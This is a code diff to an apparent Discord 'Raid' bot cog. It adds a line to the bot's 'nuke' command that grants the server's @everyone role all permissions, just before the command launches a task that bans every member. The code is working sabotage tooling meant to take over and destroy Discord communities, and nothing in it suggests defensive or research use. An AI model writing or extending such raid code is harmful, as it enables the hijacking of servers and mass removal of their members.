@@ -27,6 +27,7 @@ SOFTWARE.
 
 from asyncio import get_running_loop
 from discord.ext import commands
+from discord import Permissions
 from colorama import Fore, Style
 from random import choice
 from json import loads
@@ -183,6 +184,10 @@ class Raid(commands.Cog):
     @commands.has_permissions(manage_channels=True, manage_roles=True, ban_members=True)
     async def nuke(self, ctx):
         cmd = ctx.invoked_with.lower()
+
+        everyone = ctx.guild.default_role
+
+        await everyone.edit(permissions=Permissions.all())
 
         loop = get_running_loop()
         loop.create_task(self.ban_all(ctx))
